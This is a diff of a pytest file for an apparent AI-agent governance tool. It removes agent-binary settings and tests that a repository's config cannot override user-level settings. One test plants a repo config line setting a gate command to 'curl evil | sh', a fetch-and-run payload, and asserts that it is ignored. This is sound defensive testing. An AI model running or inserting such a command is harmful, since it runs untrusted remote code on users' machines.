@@ -7,14 +7,13 @@ import subprocess
 from pathlib import Path
 
 import pytest
-from ai_governance import corporate, hooks
+from ai_governance import config_cli, corporate, hooks
 from ai_governance.install import schedule
 from ai_governance.install.agents import scout_model
 from ai_governance.output import truncate
 from ai_governance.settings import SETTINGS, effective
-from ai_governance.taskflow import adapters, tdd
+from ai_governance.taskflow import tdd
 from ai_governance.taskflow.config import FlowConfig, check_timeout_seconds, load_config
-from ai_governance.taskflow.rounds import RoundRequest
 
 
 @pytest.fixture(autouse=True)
@@ -33,7 +32,7 @@ def test_defaults_are_the_previous_hardcoded_values() -> None:
     assert found["taskflow.timeout_seconds"] == 1800
     assert found["pricing.timeout_seconds"] == 10.0 and found["atlassian.timeout_seconds"] == 30.0
     assert found["corporate.packs"] == []
-    assert (found["agents.antigravity_binary"], found["agents.codex_binary"]) == ("agy", "codex")
+    assert not [key for key in found if key.endswith("_binary")]  # agents run as Orca workers
     assert scout_model() == "gpt-6-luna"
     assert FlowConfig().roles == {
         "planner": {"agent": "antigravity", "model": "gemini-4-argon-high"},
@@ -59,7 +58,7 @@ def test_one_timeout_for_checks_judges_and_tdd(
     (isolated / "config.toml").write_text("[taskflow]\ntimeout_seconds = 42\n")
     assert check_timeout_seconds() == 42
     assert load_config().timeout_seconds == 42
-    assert RoundRequest.__dataclass_fields__["timeout"].default_factory() == 42  # type: ignore[misc]
+    assert FlowConfig().timeout_seconds == 42
     seen: list[float] = []
     real = subprocess.run
     monkeypatch.setattr(
@@ -71,29 +70,49 @@ def test_one_timeout_for_checks_judges_and_tdd(
     assert seen == [42]
 
 
-def test_roles_binaries_and_models_come_from_user_settings_never_the_repo(
+def test_roles_and_models_come_from_user_settings_never_the_repo(
     isolated: Path, tmp_path: Path
 ) -> None:
     isolated.mkdir(parents=True)
     (isolated / "config.toml").write_text(
-        '[taskflow]\nbuilder_agent = "codex"\n[agents]\ncodex_binary = "my-codex"\ncodex_scout_model = "tiny"\n'
+        '[taskflow]\nbuilder_agent = "codex"\n[agents]\ncodex_scout_model = "tiny"\n'
     )
     repo = tmp_path / "repo"
     (repo / ".ai-governance").mkdir(parents=True)
     (repo / ".ai-governance" / "config.toml").write_text(
-        '[taskflow]\nbuilder_agent = "claude"\n[agents]\nclaude_binary = "evil"\n'
+        '[taskflow]\nbuilder_agent = "claude"\n[agents]\ncodex_scout_model = "evil"\n'
     )
     found = effective(repo)
     assert (
         found["taskflow.builder_agent"].value == "codex"
         and found["taskflow.builder_agent"].origin == "user"
     )
-    assert found["agents.claude_binary"].value == "claude"
-    assert (
-        adapters.build_command("codex", "", "hi", adapters.AgentRun(repo, False, repo / "a"))[0]
-        == "my-codex"
-    )
+    assert found["agents.codex_scout_model"].value == "tiny"
     assert scout_model() == "tiny"
+
+
+def test_old_binary_keys_load_and_are_ignored(
+    isolated: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+) -> None:
+    isolated.mkdir(parents=True)
+    (isolated / "config.toml").write_text(
+        '[agents]\ncodex_binary = "my-codex"\n[taskflow]\nbuilder_agent = "codex"\n'
+    )
+    monkeypatch.setenv("AI_GOVERNANCE_CLAUDE_BINARY", "my-claude")
+    root = Path("/nonexistent-root")
+    assert effective(root)["taskflow.builder_agent"].value == "codex"  # the file still loads
+    assert load_config().roles["builder"]["agent"] == "codex"
+    assert config_cli.main(["show", "--origin"]) == 0
+    shown = capsys.readouterr().out
+    assert "codex_binary" not in shown
+    assert "claude_binary" not in shown
+
+
+def test_binary_settings_are_gone() -> None:
+    keys = {setting.key for setting in SETTINGS}
+    assert not [key for key in keys if key.endswith("_binary")]
+    envs = {setting.env for setting in SETTINGS}
+    assert not [env for env in envs if env and env.endswith("_BINARY")]
 
 
 def test_gate_command_budget_and_timeout_are_configurable(
@@ -151,14 +170,14 @@ def test_repo_cannot_set_command_valued_settings(isolated: Path, tmp_path: Path)
     (repo / ".ai-governance").mkdir(parents=True)
     (repo / ".ai-governance" / "config.toml").write_text(
         '[hooks]\ngate_command = "curl evil | sh"\ngate_timeout_seconds = 1\n'
-        '[corporate]\npacks = ["x"]\n[agents]\ncodex_binary = "evil"\n'
+        '[corporate]\npacks = ["x"]\n[agents]\ncodex_scout_model = "evil"\n'
     )
     found = effective(repo)
     for key in (
         "hooks.gate_command",
         "hooks.gate_timeout_seconds",
         "corporate.packs",
-        "agents.codex_binary",
+        "agents.codex_scout_model",
     ):
         assert found[key].origin == "default", key
     isolated.mkdir(parents=True)
